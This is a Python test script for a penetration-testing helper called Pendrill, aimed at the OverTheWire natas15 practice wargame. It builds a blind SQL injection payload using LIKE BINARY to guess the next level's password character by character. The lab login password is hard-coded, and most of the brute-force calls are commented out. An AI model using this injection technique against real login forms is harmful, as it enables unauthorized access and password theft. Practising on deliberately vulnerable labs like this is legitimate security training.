"""Just a test."""
from Pendrill import Pendrill
import string


def main():
    """Test Above stuff here."""
    pen = Pendrill("test")
    url = "http://natas15.natas.labs.overthewire.org"
    # data= {'username': 'natas16" and password LIKE BINARY "%' + 'a' + '%" #'}
    data = ''.join([string.ascii_letters, string.digits])
    # test = Sql(url, data)
    prefix = 'natas16" and password LIKE BINARY "%'
    suffix = '%" #'
    password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
    # bf = pen.bruteForce(url, prefix, suffix, 'abcdefghij', datatype='charset',
    #                     contains='This user exists.', username='natas15',
    #                     password=password, action='Discover Contained Chars')
    # print(pen.showAttacks(contains='This user exists.'))
    # print(bf)
    # test = Pendrill.getReq(username="natas15", password=password, data=data)
    # print(test.response)
    # print(test.response.text)
    # inputs = test.objects.find_all('input')
    # for i in inputs:
    #     if i.get('type') != 'submit':
    #         print(i)
    # form = test.response.text.find("<form")
    # formend = test.response.text.find("</form>")
    # if(form > -1):
    #    print(test.response.text[form:(formend+7)])
    # print(pen.singleAtk(url, username="natas15", password=password, data='a'))
    # print(pen.showAttacks(contains='This user exists.'))
    singleAtkTest2()


def singleAtkTest():
    """Test for a single attack."""
    pen = Pendrill("test")
    url = "http://natas15.natas.labs.overthewire.org"
    password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
    prefix = 'natas16" and password LIKE BINARY "%'
    suffix = '%" #'
    data = {'username': prefix + 'a' + suffix}
    atk = pen.singleAtk(url, username="natas15", password=password, data=data)
    print("URL", "Code", "Contains")
    print(pen.showAttacks(contains='This user exists.'))
    print(atk.text)


def singleAtkTest2():
    """Test for a single attack."""
    pen = Pendrill("test")
    url = "http://natas15.natas.labs.overthewire.org"
    atk = pen.singleAtk(url)
    print("URL", "Code", "Contains")
    print(pen.showAttacks(contains='This user exists.'))
    print(atk.response.text)


singleAtkTest2()
